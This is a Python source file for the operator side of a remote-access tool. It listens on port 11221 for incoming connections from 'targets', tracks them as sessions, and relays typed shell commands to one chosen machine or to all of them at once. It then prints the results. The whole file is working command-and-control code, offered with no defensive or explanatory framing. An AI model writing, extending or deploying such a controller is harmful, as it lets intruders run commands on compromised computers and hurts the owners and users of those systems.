#!/usr/bin/python

import socket
import json
import struct
import utils
import os
import base64
import readline
import threading

ips = []
targets = []
clients = 0
stop_threads = False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 11221))
s.listen(5)
print("Listening for connections ")


def server():
    global s
    global ips
    global targets
    global clients
    while not stop_threads:
        s.settimeout(1)
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print("\nConnection established from %s" % str(ip))
            clients += 1
        except Exception as e:
            pass


t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input("CENTER ~ ")
    if command == "targets":
        count = 0
        for ip in ips:
            print(f"Session {count} --  {ip}")
            count += 1
    if command[:7] == "session":
        try:
            num = int(command[8:])
            target_socket = targets[num]
            target_ip = ips[num]
            while True:
                try:
                    cmd = input(f"{target_ip}~$ ")
                    utils.reliable_send(target_socket, cmd)
                    if cmd == "q":
                        break
                    elif cmd == "close":
                        target_socket.close()
                        targets.remove(target_socket)
                        ips.remove(target_ip)
                        break
                except Exception as e:
                    print(str(e))

                message = utils.receive_frame(target_socket)
                if message:
                    print(message, flush=True)
        except Exception as e:
            print(str(e))
            pass
    if command [:7] == "sendall":
        targets_len = len(targets)
        for i in range(0,targets_len):
            target_socket = targets[i]
            target_ip = ips[i]
            utils.reliable_send(target_socket, command)
            print(f"Sent '{command[8:]}' to {target_ip}")
    if command == "help":
        print(utils.help_message)
    if command == "exit":
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t1.join()
        break
